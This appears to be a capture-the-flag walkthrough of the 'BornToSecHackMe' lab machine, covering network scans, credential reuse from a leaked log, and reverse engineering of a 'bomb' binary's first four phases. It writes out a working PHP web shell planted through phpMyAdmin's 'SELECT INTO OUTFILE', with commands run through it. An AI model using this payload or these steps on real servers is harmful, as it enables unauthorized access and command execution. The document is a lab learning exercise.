![[Pasted image 20240417170443.png]]
![[Pasted image 20240417170507.png]]
![[Pasted image 20240417170537.png]]






I launched the machine and made a scan on my local network:
```shell
┌──(fab㉿kali)-[~]
└─$ nmap 192.168.56.3/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 16:50 CEST
Nmap scan report for DESKTOP-D3V2624 (192.168.56.1)
Host is up (0.56s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap scan report for 192.168.56.101
Host is up (0.0097s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (2 hosts up) scanned in 5.31 seconds

┌──(fab㉿kali)-[~]
└─$ sudo nmap -sU -sC -sV -Pn 192.168.56.101
[sudo] password for fab:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 16:49 CEST
Nmap scan report for 192.168.56.101
Host is up (0.0020s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1123.69 seconds

┌──(fab㉿kali)-[~]
└─$
```
and discovered this IP:
![[Pasted image 20240417165322.png]]
```shell
┌──(fab㉿kali)-[~]
└─$ nmap -sC -sV 192.168.56.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:09 CEST
Nmap scan report for 192.168.56.101
Host is up (0.0024s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap     Dovecot imapd
|_ssl-date: 2024-04-17T15:09:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: SASL-IR Pre-login more have LITERAL+ OK listed STARTTLS capabilities post-login LOGINDISABLEDA0001 IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2024-04-17T15:09:34+00:00; -1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: SASL-IR Pre-login more LITERAL+ have capabilities AUTH=PLAINA0001 listed post-login OK IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE
|_ssl-date: 2024-04-17T15:09:34+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.27 seconds

┌──(fab㉿kali)-[~]
└─$ feroxbuster -u https://192.168.56.101 -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowerca
se.txt -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://192.168.56.101
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      318c https://192.168.56.101/forum => https://192.168.56.101/forum/
301      GET        9l       28w      323c https://192.168.56.101/phpmyadmin => https://192.168.56.101/phpmyadmin/
301      GET        9l       28w      320c https://192.168.56.101/webmail => https://192.168.56.101/webmail/
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      328c https://192.168.56.101/webmail/plugins => https://192.168.56.101/webmail/plugins/
301      GET        9l       28w      327c https://192.168.56.101/webmail/themes => https://192.168.56.101/webmail/themes/
301      GET        9l       28w      327c https://192.168.56.101/webmail/images => https://192.168.56.101/webmail/images/
301      GET        9l       28w      327c https://192.168.56.101/webmail/config => https://192.168.56.101/webmail/config/
301      GET        9l       28w      325c https://192.168.56.101/forum/images => https://192.168.56.101/forum/images/
301      GET        9l       28w      321c https://192.168.56.101/forum/js => https://192.168.56.101/forum/js/
301      GET        9l       28w      327c https://192.168.56.101/forum/includes => https://192.168.56.101/forum/includes/
301      GET        9l       28w      326c https://192.168.56.101/forum/modules => https://192.168.56.101/forum/modules/
301      GET        9l       28w      325c https://192.168.56.101/forum/themes => https://192.168.56.101/forum/themes/
200      GET        1l       90w     4450c https://192.168.56.101/forum/js/admin.min.js
200      GET        1l      191w    14244c https://192.168.56.101/forum/js/posting.min.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/rss.inc.php => ../index.php
200      GET      315l     1031w     9970c https://192.168.56.101/forum/js/admin.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/avatar.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/account_locked.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/js_defaults.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/register.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/main.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/auto_login.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/user.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/contact.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/entry.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/posting.inc.php => ../index.php
200      GET        3l      321w    22481c https://192.168.56.101/forum/js/main.min.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/delete_cookie.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/index.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/disabled.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/insert_flash.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/login.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/upload_image.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/thread.inc.php => ../index.php
200      GET      812l     2589w    26535c https://192.168.56.101/forum/js/posting.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/functions.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/page.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/admin.inc.php => ../index.php
200      GET     1474l     4831w    45512c https://192.168.56.101/forum/js/main.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/search.inc.php => ../index.php
301      GET        9l       28w      342c https://192.168.56.101/webmail/plugins/administrator => https://192.168.56.101/webmail/plugins/administrator/
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/test => https://192.168.56.101/webmail/plugins/test/
301      GET        9l       28w      331c https://192.168.56.101/webmail/themes/css => https://192.168.56.101/webmail/themes/css/
301      GET        9l       28w      330c https://192.168.56.101/phpmyadmin/themes => https://192.168.56.101/phpmyadmin/themes/
301      GET        9l       28w      326c https://192.168.56.101/phpmyadmin/js => https://192.168.56.101/phpmyadmin/js/
200      GET        6l       15w      382c https://192.168.56.101/forum/images/smilies/biggrin.png
200      GET        4l       10w      325c https://192.168.56.101/forum/images/smilies/tongue.png
200      GET        4l       12w      303c https://192.168.56.101/forum/images/smilies/wink.png
200      GET        3l        9w      303c https://192.168.56.101/forum/images/smilies/smile.png
200      GET        3l        8w      292c https://192.168.56.101/forum/images/smilies/frown.png
200      GET        0l        0w        0c https://192.168.56.101/forum/includes/classes/Backup.class.php
200      GET        3l        9w      303c https://192.168.56.101/forum/images/smilies/neutral.png
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/akismet/akismet.class.php
200      GET        3l        6w      122c https://192.168.56.101/forum/modules/captcha/captcha_image.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/stringparser_bbcode/stringparser.class.php
200      GET       93l      281w     5742c https://192.168.56.101/forum/themes/default/main.tpl
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/bad-behavior/bad-behavior-generic.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/captcha/captcha.php
200      GET       22l       49w     1388c https://192.168.56.101/forum/themes/default/rss.tpl
200      GET        1l        6w       45c https://192.168.56.101/forum/modules/bad-behavior/index.html
200      GET       63l      262w     3176c https://192.168.56.101/forum/themes/default/insert_flash.tpl
200      GET        7l       16w      256c https://192.168.56.101/forum/themes/default/ajax_preview.tpl
200      GET      139l      506w     7201c https://192.168.56.101/forum/themes/default/upload_image.tpl
200      GET       87l      318w     4450c https://192.168.56.101/forum/themes/default/avatar.tpl
301      GET        9l       28w      323c https://192.168.56.101/forum/lang => https://192.168.56.101/forum/lang/
200      GET       21l       63w      955c https://192.168.56.101/forum/themes/default/js_config.ini
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/stringparser_bbcode/stringparser_bbcode.class.php
301      GET        9l       28w      330c https://192.168.56.101/forum/templates_c => https://192.168.56.101/forum/templates_c/
200      GET      403l     1325w    28929c https://192.168.56.101/forum/themes/default/style.min.css
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/geshi/geshi.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/smarty/Smarty.class.php
200      GET      600l     3494w    37414c https://192.168.56.101/forum/themes/default/style.css
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
200      GET     1106l     3513w    58607c https://192.168.56.101/forum/lang/chinese.lang
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
200      GET        0l        0w        0c https://192.168.56.101/forum/templates_c/8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
200      GET     1105l     7187w    68480c https://192.168.56.101/forum/lang/spanish.lang
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/demo => https://192.168.56.101/webmail/plugins/demo/
200      GET     1104l     6975w    69761c https://192.168.56.101/forum/lang/italian.lang
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/info => https://192.168.56.101/webmail/plugins/info/
200      GET     1106l     6152w    68103c https://192.168.56.101/forum/lang/german.lang
200      GET     1114l     6827w    64755c https://192.168.56.101/forum/lang/english.lang
200      GET     1103l     6604w    66692c https://192.168.56.101/forum/lang/norwegian.lang
200      GET     1106l     7670w    73677c https://192.168.56.101/forum/lang/french.lang
200      GET     1115l     6226w    65855c https://192.168.56.101/forum/lang/swedish.lang
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
200      GET     1104l     6396w    66784c https://192.168.56.101/forum/lang/croatian.lang
200      GET     1117l     6551w    96868c https://192.168.56.101/forum/lang/russian.lang
200      GET     1101l     6130w   123515c https://192.168.56.101/forum/lang/tamil.lang
301      GET        9l       28w      337c https://192.168.56.101/webmail/plugins/calendar => https://192.168.56.101/webmail/plugins/calendar/
200      GET     1109l     6168w    69500c https://192.168.56.101/forum/lang/turkish.lang
200      GET        1l        8w      374c https://192.168.56.101/forum/themes/default/images/favicon.ico
200      GET        3l        8w      245c https://192.168.56.101/forum/themes/default/images/complete_thread.png
200      GET       80l      371w     4935c https://192.168.56.101/forum/index
301      GET        9l       28w      325c https://192.168.56.101/forum/update => https://192.168.56.101/forum/update/
301      GET        9l       28w      324c https://192.168.56.101/webmail/src => https://192.168.56.101/webmail/src/
401      GET       14l       56w      482c https://192.168.56.101/phpmyadmin/setup
<SNIP>

┌──(fab㉿kali)-[~]
└─$
```
![[Pasted image 20240418113308.png]]
![[Pasted image 20240418100144.png]]
![[Pasted image 20240418113138.png]]

In the forum, by scrolling the ["Probleme login ?"](https://192.168.56.101/forum/index.php?id=6) room, we can see a user making many a connection attempt until they can log as "lmezard": 
![[Pasted image 20240418113422.png]]
![[Pasted image 20240418113755.png]]
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

With the following credentials:
```
lmezard:!q\]Ej?*5K5cy*AJ
```
I could accede to the forum:
![[Pasted image 20240418125614.png]]
If I explore the "Users" tab:
![[Pasted image 20240418135915.png]]
![[Pasted image 20240418135818.png]]
![[Pasted image 20240418135846.png]]

With the credentials:
```
laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
```
we have access to the mail box:
![[Pasted image 20240422154048.png]]

Two mails awaited us, among which:
![[Pasted image 20240422154250.png]]

The credentials:
```
root:Fg-'kKXBj87E:aJ$
```
allow us to accede to the phpMyAdmin page:
![[Pasted image 20240422154638.png]]

We have then access to a database in which information about users is stored:
![[Pasted image 20240422160109.png]]

```shell
┌──(fab㉿kali)-[~]
└─$ cat forum
ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28
a12e059d6f4c21c6c5586283c8ecb2b65618ed0a0dc1b302a2
d30668b779542d60c4cde29e7170148198b1623f4453866797
f8562b53084d60efa4208fa50d1ef753ef18e089d2dd56c4ed
0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90
f10b3271bf523f12ebd58ef8581c851991bf0d4b4c4bf49d7c

┌──(fab㉿kali)-[~]
└─$
```

However, I can't identify the kind of hashing..

Usually MySQL5 Hash follows this pattern:
![[Pasted image 20240422164245.png]]
But it doesn't seem to be the case.

In the "Variables" tab:
![[Pasted image 20240511172423.png]]
we can find the version of the PHPMyAdmin server:
![[Pasted image 20240511172400.png]]

By following this [guide](https://medium.com/@959652664/summary-and-analysis-of-penetration-testing-based-on-phpmyadmin-784896851cf9), to make MySQL execute commands like the following one (it appears we have writing permissions in the directory `/var/www/forum/templates_c`):
```mysql
select "<html> <body> <form method='GET' name='<?php echo basename($_SERVER['PHP_SELF']); ?>'> <input type='TEXT' name='cmd' id='cmd' size='80'> <input type='SUBMIT' value='Execute'> </form> <pre> <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body> <script>document.getElementById('cmd').focus();</script> </html>" into outfile "/var/www/forum/templates_c/test.php"
```
![[Pasted image 20240423142613.png]]

![[Pasted image 20240423142630.png]]

And we can find a webshell at [this address](https://192.168.56.101/forum/templates_c/test.php):
![[Pasted image 20240423142903.png]]

At the same time, by inserting and executing th code snippet:
```mysql
select "<?php phpinfo();?>" into outfile "/var/www/forum/templates_c/intrusive.php"
```
we have access to:
![[Pasted image 20240511175308.png]]

Typing:
```shell
cd /home/LOOKATME && cat password
lmezard:G!@M6f4Eatau{sF"

find / -perm -003 -type d 2>/dev/null # 4 for r, 2 for w, 1 for x
 /run/shm
/run/lock
/tmp
/tmp/.ICE-unix
/tmp/.X11-unix
/var/crash
/var/lib/php5
/var/tmp
/var/www/forum/templates_c
/rofs
/rofs/tmp
/rofs/var/crash
/rofs/var/lib/php5
/rofs/var/tmp
/rofs/var/www/forum/templates_c

find / -user www-data 2>/dev/null
```

I think we have to follow the steps of the anonymous user who left a trail of bread crumbs...

Let's try to connect via FTP:
```shell
┌──(fab㉿kali)-[~]
└─$ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53205|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||30922|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |***************************************************************************|    96      110.42 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (32.24 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||49751|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***************************************************************************|   790 KiB   14.42 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (14.10 MiB/s)
ftp>
```

We obtain two files:
```shell
┌──(fab㉿kali)-[~]
└─$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

┌──(fab㉿kali)-[~]
└─$ file fun
fun: POSIX tar archive (GNU)

┌──(fab㉿kali)-[~]
└─$ tar -xvf fun
<SNIP>

┌──(fab㉿kali)-[~/ft_fun]
└─$ grep -rn main
BJPCP.pcap:572:int main() {
```
We find a `main()` function:
```c
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12()); e
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```
we look for the function `getme1()` now:
```shell
┌──(fab㉿kali)-[~/ft_fun]
└─$ grep -rn getme1
BJPCP.pcap:278:char getme10() {
BJPCP.pcap:379:char getme11() {
BJPCP.pcap:474:char getme12()
BJPCP.pcap:589: printf("%c",getme1());
BJPCP.pcap:598: printf("%c",getme10());
BJPCP.pcap:599: printf("%c",getme11());
BJPCP.pcap:600: printf("%c",getme12());
331ZU.pcap:1:char getme1() {

┌──(fab㉿kali)-[~/ft_fun]
└─$ cat 331ZU.pcap
char getme1() {

//file5

┌──(fab㉿kali)-[~/ft_fun]
└─$ grep -rn file6
<SNIP>
APM1E.pcap:3://file6
<SNIP>

┌──(fab㉿kali)-[~/ft_fun]
└─$ cat APM1E.pcap
        return 'I';

//file6

┌──(fab㉿kali)-[~/ft_fun]
└─$
```

And so on. Starting from `getme8()` the letters are in clear text.

Until we have:
```shell
┌──(fab㉿kali)-[~/ft_fun]
└─$ echo -n Iheartpwnage > password

┌──(fab㉿kali)-[~/ft_fun]
└─$ sha256sum password
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  password

┌──(fab㉿kali)-[~/ft_fun]
└─$
```
Our credentials are:
```
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

And we can connect via SSH:
```shell
┌──(fab㉿kali)-[~]
└─$ ssh laurie@192.168.56.101
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password:
laurie@BornToSecHackMe:~$ ls -la
total 34
drwxr-x--- 3 laurie   laurie   143 Oct 15  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 laurie   laurie     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 laurie   laurie   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 laurie   laurie  3489 Oct 13  2015 .bashrc
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
-rwxr-x--- 1 laurie   laurie   675 Oct  8  2015 .profile
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
-rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
P

BOOM!!!
The bomb has blown up.
laurie@BornToSecHackMe:~$
```

### The Bomb

I transfer the file to my session to analyze it:
```
┌──(fab㉿kali)-[~/ft_fun]
└─$ scp laurie@192.168.56.101:~/bomb ./
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password:
bomb                                                                                    100%   26KB   2.9MB/s   00:00

┌──(fab㉿kali)-[~/ft_fun]
└─$ ghidra
```

It seems that we have to pass six tests: 
```c
int main(int argc,char **argv)
{
  char *pcVar1;
  int in_stack_00000004;
  char **in_stack_00000008;
  
  if (in_stack_00000004 == 1) {
    infile = stdin;
  }
  else {
    if (in_stack_00000004 != 2) {
      printf("Usage: %s [<input_file>]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
      exit(8);
    }
    infile = (_IO_FILE *)fopen(in_stack_00000008[1],"r");
    if ((FILE *)infile == (FILE *)0x0) {
      printf("%s: Error: Couldn\'t open %s\n",*in_stack_00000008,in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
      exit(8);
    }
  }
  initialize_bomb();
  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
  printf("only one life good luck !! Have a nice day!\n");
  pcVar1 = read_line();
  phase_1(pcVar1);
  phase_defused();
  printf("Phase 1 defused. How about the next one?\n");
  pcVar1 = read_line();
  phase_2(pcVar1);
  phase_defused();
  printf("That\'s number 2.  Keep going!\n");
  pcVar1 = read_line();
  phase_3(pcVar1);
  phase_defused();
  printf("Halfway there!\n");
  pcVar1 = read_line();
  phase_4(pcVar1);
  phase_defused();
  printf("So you got that one.  Try this one.\n");
  pcVar1 = read_line();
  phase_5(pcVar1);
  phase_defused();
  printf("Good work!  On to the next...\n");
  pcVar1 = read_line();
  phase_6(pcVar1);
  phase_defused();
  return 0;
}
```

The first test simply asks us to enter a string:
```c
void phase_1(char *param_1)
{
  int iVar1;
  
  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

The program uses the function `readline()` to retrieve our string.

This time we have to enter a string with 7 numbers in increasing order and respecting a certain condition:
```c
stack[1] must be equal to 1
iVar1 = 1;
stack[2] must be equal to 2 * stack[1] // 2
iVar1 = 2
stack[3] must be equal to 3 * stack[2] // 6
iVar1 = 3
stack[4] must be equal to 4 * stack[3] // 24
iVar1 = 4
stack[5] must be equal to 5 * stack[4] // 120
iVar1 = 5
stack[6] must be equal to 6 * stack[5] // 720

1 2 6 24 120 720
```

Our string will be parsed by a [`sscanf()`](https://linux.die.net/man/3/sscanf):
```c
void read_six_numbers(char *param_1,int param_2)
{
  int iVar1;
  
  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",(int *)param_2,(int *)(param_2 + 4),
                 (int *)(param_2 + 8),(int *)(param_2 + 0xc),(int *)(param_2 + 0x10),
                 (int *)(param_2 + 0x14));
  if (iVar1 < 6) {
    explode_bomb();
  }
  return;
}

void phase_2(char *param_1)
{
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1,(int)(aiStack_20 + 1));
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```

For the following test I typed "0 q 777" (however, various solutions are possible):
```c
void phase_3(char *param_1)
{
  int iVar1;
  uchar uVar2;
  uint local_10;
  uchar local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",(int *)&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    uVar2 = 'q';
    if (local_8 != 0x309) { // 777
      explode_bomb();
    }
    break;
  case 1:
    uVar2 = 'b';
    if (local_8 != 0xd6) { // 214
      explode_bomb();
    }
    break;
  case 2:
    uVar2 = 'b';
    if (local_8 != 0x2f3) { // 755
      explode_bomb();
    }
    break;
  case 3:
    uVar2 = 'k';
    if (local_8 != 0xfb) { // 251
      explode_bomb();
    }
    break;
  case 4:
    uVar2 = 'o';
    if (local_8 != 0xa0) { // 160
      explode_bomb();
    }
    break;
  case 5:
    uVar2 = 't';
    if (local_8 != 0x1ca) { // 458
      explode_bomb();
    }
    break;
  case 6:
    uVar2 = 'v';
    if (local_8 != 0x30c) { // 780
      explode_bomb();
    }
    break;
  case 7:
    uVar2 = 'b';
    if (local_8 != 0x20c) { // 524
      explode_bomb();
    }
    break;
  default:
    uVar2 = 'x';
    explode_bomb();
  }
  if (uVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

For the next test, `iVar1` should be equal to 55 after the operation.
For the record, `sscanf()` returns the number of matches found and assigned:
```c
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) { // 55
    explode_bomb();
  }
  return;
}
```

I tested with a program coded for this purpose:
```shell
┌──(fab㉿kali)-[~]
└─$ ./a.out 9
1 9
win!55

┌──(fab㉿kali)-[~]
└─$ ┌──(fab㉿kali)-[~]
└─$ cat gatto.c
#include <stdio.h>

int func4(int param_1)
{
  int iVar1;
  int iVar2;

  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}


int main(int ac, char *av[]) {
        if (ac != 2)
                return 1;
        char *n = av[1];
        int local;
        int var = sscanf(n, "%d", &local);
        printf("%d %d\n", var, local);

        var = func4(local);
        if (var == 55) { // 55
           printf("win!");
         }
        printf("%d\n", var);
}

┌──(fab㉿kali)-[~]
└─$
```
